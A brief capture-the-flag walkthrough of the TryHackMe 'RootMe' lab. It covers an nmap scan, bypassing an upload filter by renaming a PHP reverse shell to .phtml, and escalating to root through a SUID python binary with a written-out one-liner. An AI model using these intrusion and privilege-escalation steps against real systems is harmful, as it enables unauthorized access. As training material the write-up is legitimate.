# RootMe

[RootMe](https://tryhackme.com/room/rrootme)

## Solution

### Task 2

- nmap scan

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- dirb scan

we got the hidden page at `panel`. and it looks like an upload form.

### Task 3

in the network tab I can see PHPSESSID which makes me think there is some php
involved.

we cannot send a php file as it is not allowed. so we need to bypass the file
upload.

the trick was to change the php extention to for example phtml, because the
file upload checked for php. then we can upload a revshell script and connect
via netcat.

I went to the `/var/www` folder and found user.txt with the first flag.

### Task 3

Search for files with SUID permission, which file is weird?

I used `find / -user root -perm /4000` to find files with SUID.

I found python to have SUID. which is weird. we can open a python shell and try
to get a tty.

I ran `python -c 'import os; os.setuid(0); os.system("/bin/sh")'` which sets
the user id to root, since this is a SUID binary. the new shell will be root.

next we need to just cat the flag from the root home.
